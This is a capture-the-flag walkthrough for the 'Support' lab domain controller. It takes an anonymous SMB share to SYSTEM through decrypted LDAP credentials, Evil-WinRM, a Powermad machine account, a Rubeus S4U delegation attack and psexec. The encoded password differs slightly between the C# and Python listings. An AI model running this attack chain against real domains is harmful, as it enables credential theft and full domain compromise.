---
title: 'Support: Hidden in the Info Field, From SMB Share to Domain Admin'
published: 2026-05-12
description: ''
image: ''
tags: []
category: 'Penetration Tester'
draft: false 
lang: ''
---
# Introduction

Support is an Easy Windows machine that begins with an open SMB share allowing anonymous access. Inside the share, a custom .NET executable `UserInfo.exe` is found. Reverse engineering or network analysis reveals LDAP credentials used by the binary. Those credentials are used to query the domain LDAP and discover a user `support` whose `info` attribute contains a password. This password grants WinRM access. On the machine, BloodHound analysis shows the `Shared Support Accounts` group (of which `support` is a member) has `GenericAll` on the Domain Controller. A Resource‑Based Constrained Delegation attack is performed to obtain a ticket for the Administrator and ultimately compromise the domain, yielding `NT Authority\\System` access.

**Skills Required:**

- Basic Windows & Active Directory knowledge
- Basic LDAP understanding

**Skills Learned:**

- Anonymous SMB share enumeration
- LDAP querying and information extraction
- Resource‑Based Constrained Delegation (RBCD) exploitation

## Enumeration

### Nmap Scan

We begin with a full TCP scan against the target.

```bash
nmap -sC -sV -Pn 10.129.178.20
```

**Nmap Output (relevant ports):**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
```

Numerous open ports indicate a Windows domain controller. Ports 389 (LDAP), 636 (LDAPS), 445 (SMB), and 5985 (WinRM) are especially interesting.

### SMB Shares

Let’s enumerate accessible SMB shares anonymously.

```bash
smbclient -L \\\\\\\\10.129.178.20\\\\
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
support-tools   Disk      support staff tools
SYSVOL          Disk      Logon server share
```

The non‑default `support-tools` share catches our attention. Connect to it:

```bash
smbclient \\\\\\\\10.129.178.20\\\\support-tools
```

Listing the contents:

```
smb: \\> dir
  .                                   D        0  Wed Jul 20 20:01:06 2022
  ..                                  D        0  Sat May 28 14:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 14:19:19 2022
  npp.8.4.1.portable.x64.zip         A  5439245  Sat May 28 14:19:55 2022
  putty.exe                           A  1273576  Sat May 28 14:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 14:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 20:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 14:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe   A 44398000  Sat May 28 14:19:43 2022
```

The file `UserInfo.exe.zip` is not a standard tool. Download it for analysis.

```bash
smb: \\> get UserInfo.exe.zip
```

After exiting the SMB session, extract the archive:

```bash
unzip UserInfo.exe.zip
```

**Extracted contents:**

```
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe
  inflating: ... (several DLLs)
```

The main executable `UserInfo.exe` is a .NET assembly.

```bash
file UserInfo.exe
```

```
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

### Reverse Engineering UserInfo.exe

### Option 1: ILSpy Decompilation

We use Avalonia ILSpy on Linux to decompile the binary. Download and run ILSpy, then load `UserInfo.exe`.

The decompiled source reveals a class `Protected` and a method `ldapQuery()`:

```csharp
public ldapQuery()
{
    string password = Protected.getPassword();
    entry = new DirectoryEntry("LDAP://support.htb", "support\\\\ldap", password);
    entry.set_AuthenticationType((AuthenticationTypes)1);
    ds = new DirectorySearcher(entry);
}
```

The password is retrieved from `Protected.getPassword()`, which XOR‑decrypts a hardcoded string.

```csharp
internal class Protected
{
    private static string enc_password = "0Nv32PTwgyjzq9/8j5TbmvPd3e7WhtWwyuPsy076/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)(uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

We can replicate the decryption in Python:

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWwyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ""
for e, k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)

print(res)
```

**Decrypted password:**

```
nvEfEK16^1aM4$e7Ac1Uf8x$tRWxPwO1%mz
```

### LDAP Enumeration

Now we have LDAP credentials. Add the hostname to `/etc/hosts`:

```bash
echo '10.129.178.20 support.htb' | sudo tee -a /etc/hosts
```

Use `ldapsearch` to query the domain:

```bash
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7Ac1Uf8x$tRWxPwO1%mz' -b "dc=support,dc=htb" "*"
```

**Sample output (truncated):**

```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
...
info: Ironside47pleasure40Watchful
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
...
```

The `info` attribute holds what appears to be a password. The user `support` is a member of `Remote Management Users`, allowing WinRM access.

### Alternative: Apache Directory Studio

A graphical LDAP browser can also be used. After connecting with the same credentials, navigate to `DC=support,DC=htb` → `CN=Users` → `CN=support`. The `info` attribute is displayed in the right pane.

**Apache Directory Studio – support user properties:**

```
Attribute             Value
---------             -----
cn                    support
info                  Ironside47pleasure40Watchful
memberOf             CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
                     CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
...
```

## Foothold

With the password `Ironside47pleasure40Watchful`, connect via WinRM using Evil‑WinRM:

```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

```
Evil-WinRM shell v3.4
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\support\\Documents> whoami
support\\support
```

The user flag is located at `C:\\Users\\Support\\Desktop\\user.txt`.

## Privilege Escalation

### Domain Reconnaissance

Check the Active Directory domain information:

```powershell
Get-ADDomain
```

**Output (key fields):**

```
DistinguishedName          : DC=support,DC=htb
DNSRoot                    : support.htb
DomainMode                 : Windows2016Domain
InfrastructureMaster       : dc.support.htb
PDCEmulator                : dc.support.htb
...
```

The machine is the Domain Controller (`dc.support.htb`). Add it to `/etc/hosts`:

```bash
echo '10.129.178.20 dc.support.htb' | sudo tee -a /etc/hosts
```

Check current user’s group membership:

```powershell
whoami /groups
```

**Group list:**

```
GROUP NAME                                    TYPE             SID
============================================= ================ ===============================================
Everyone                                      Well-known group S-1-1-0
BUILTIN\\Remote Management Users               Alias            S-1-5-32-580
BUILTIN\\Users                                 Alias            S-1-5-32-545
BUILTIN\\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554
NT AUTHORITY\\NETWORK                          Well-known group S-1-5-2
NT AUTHORITY\\Authenticated Users              Well-known group S-1-5-11
NT AUTHORITY\\This Organization                Well-known group S-1-5-15
SUPPORT\\Shared Support Accounts               Group            S-1-5-21-1677581083-3380853377-188903654-1103
NT AUTHORITY\\NTLM Authentication              Well-known group S-1-5-64-10
Mandatory Label\\Medium Mandatory Level        Label            S-1-16-8192
```

The `Shared Support Accounts` group is non‑default. Further BloodHound analysis reveals its privileges.

### BloodHound Analysis

Collect AD data using SharpHound. Upload the binary via Evil‑WinRM:

```powershell
upload SharpHound.exe
```

Run the collector:

```powershell
.\\SharpHound.exe -c All
```

**Execution output:**

```
2022-12-17T07:01:28.4071455-08:00|INFORMATION|SharpHound 1.1.0
2022-12-17T07:01:28.6993832-08:00|INFORMATION|Initializing SharpHound at 7:01 AM on 12/17/2022
...
2022-12-17T07:02:03.1816281-08:00|INFORMATION|Enumeration finished in 00:00:34.4972467
```

A ZIP file is created (e.g., `20221217070128_BloodHound.zip`). Download it:

```powershell
download 20221217070128_BloodHound.zip
```

Load the ZIP into BloodHound. Mark the user `SUPPORT@SUPPORT.HTB` as owned. View the node analysis:

**BloodHound Node Info – Outbound Object Control:**

```
First Degree Object Control          : 0
Group Delegated Object Control       : 1   <--- Click to expand
Transitive Object Control            : ...
```

Expanding the Group Delegated Object Control reveals:

```
Shared Support Accounts (SUPPORT.HTB) – GenericAll on DC.SUPPORT.HTB
```

**BloodHound Help for GenericAll:**

> Full control of a computer object can be used to perform a resource‑based constrained delegation attack.
> 
> 
> Abusing this primitive is currently only possible through the Rubeus project…
> 

Because `support` is a member of `Shared Support Accounts`, which has `GenericAll` on the DC, we can perform an RBCD attack.

### Resource‑Based Constrained Delegation (RBCD)

### Prerequisites

- The user is in `Authenticated Users` (default quota allows adding computers).
- `ms-ds-machineaccountquota` must be > 0.

Check the quota:

```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

**Output:**

```
ms-DS-MachineAccountQuota
----------------------------
                          10
```

The attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` of the DC must be empty (we’ll verify later).

### 1. Create a Fake Computer Object

Upload and import PowerMad.ps1:

```powershell
. .\\Powermad.ps1
```

Create a new machine account:

```powershell
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

**Output:**

```
[+] Machine account FAKE-COMP01 added
```

Verify:

```powershell
Get-ADComputer -identity FAKE-COMP01
```

**Output (SID highlighted):**

```
DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb
Enabled           : True
Name              : FAKE-COMP01
ObjectClass       : computer
ObjectGUID        : ...
SamAccountName    : FAKE-COMP01$
SID               : S-1-5-21-1677581083-3380853377-188903654-5601
...
```

### 2. Configure the DC to Trust FAKE-COMP01

Set the `PrincipalsAllowedToDelegateToAccount` on the DC:

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

Verify:

```powershell
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

**Output:**

```
PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}
```

Now confirm the underlying attribute:

```powershell
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

**Output (raw bytes):**

```
msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128, ...}
```

To see the interpreted Security Descriptor, convert the bytes:

```powershell
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor
$Descriptor.DiscretionaryAcl
```

**Output:**

```
ControlFlags     : DiscretionaryAclPresent, SelfRelative
Owner            : S-1-5-32-544
Group            :
DiscretionaryAcl : {System.Security.AccessControl.CommonAce}
...
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5601   (FAKE-COMP01)
AceType            : AccessAllowed
AccessMask         : 983551
...
```

The DC now allows `FAKE-COMP01$` to delegate.

### 3. Perform the S4U Attack with Rubeus

First, calculate the RC4 hash of the fake computer’s password using Rubeus:

```powershell
.\\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

**Output:**

```
   ______        _
  (_____ \\      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \\| ___ | | | |/___)
  | |  \\ \\| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123
[*] Input username             : FAKE-COMP01$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfake-comp01.support.htb
[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
[*]       aes128_cts_hmac_sha1 : 06C1EABAD3A21C24DF384247BC85C540
[*]       aes256_cts_hmac_sha1 : FF7BA224B544AA9700B2BEE94EADBA7855EF81A1E05B7EB33D4BCD55807FF53
[*]       des_cbc_md5          : 5B045E854358687C
```

Use the RC4 hash to request a service ticket for the Administrator:

```powershell
.\\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

**Output (last TGS ticket Base64 encoded):**

```
   ______        _
  (_____ \\      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \\| ___ | | | |/___)
  | |  \\ \\| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\\FAKE-COMP01$'
[*] Using domain controller: ::1:88
[*] TGT request successful!
[*] base64(ticket.kirbi):
      doIFhDCCBYcgAwIBBaEDAgEwooIEmDCCBJRhggSOMIIE... <snip>

[*] Action: S4U
[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[*] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
[*] base64(ticket.kirbi):
      doIFrDCCBaigAwIBBaEDAgEwooIExJCCBMJhggs+MIIE... <snip>

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[*] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
      doIGaDCCBmSgAwIBBaEDAgEwooIEjeCCBXzhggVymII... (full Base64 ticket)
[*] Ticket successfully imported!
```

**Important:** Copy the last Base64 ticket and save it to a file `ticket.kirbi.b64` (remove any whitespace).

### 4. Use the Ticket Locally

Convert the Base64 ticket to a `.kirbi` file, then to a Linux‑compatible ccache file:

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
```

Now use Impacket’s `psexec.py` to obtain a SYSTEM shell:

```bash
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

**Shell output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.support.htb...
[*] Found writable share ADMIN$
[*] Uploading file NeYKdoVH.exe
[*] Opening SVCManager on dc.support.htb...
[*] Creating service mba on dc.support.htb...
[*] Starting service mba...
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami
nt authority\\system
```

The root flag is located at `C:\\Users\\Administrator\\Desktop\\root.txt`.

# Conclusion

This machine demonstrated a realistic attack path:

1. **Information Leakage via SMB** – An internal tool left on an open share revealed LDAP credentials.
2. **LDAP Enumeration** – A user’s password stored in the `info` field gave initial access.
3. **Active Directory Misconfiguration** – Excessive rights (`GenericAll`) allowed a Resource‑Based Constrained Delegation attack, leading to full domain compromise.

By combining simple enumeration, credential discovery, and well‑known AD attack techniques, we gained SYSTEM access on the domain controller.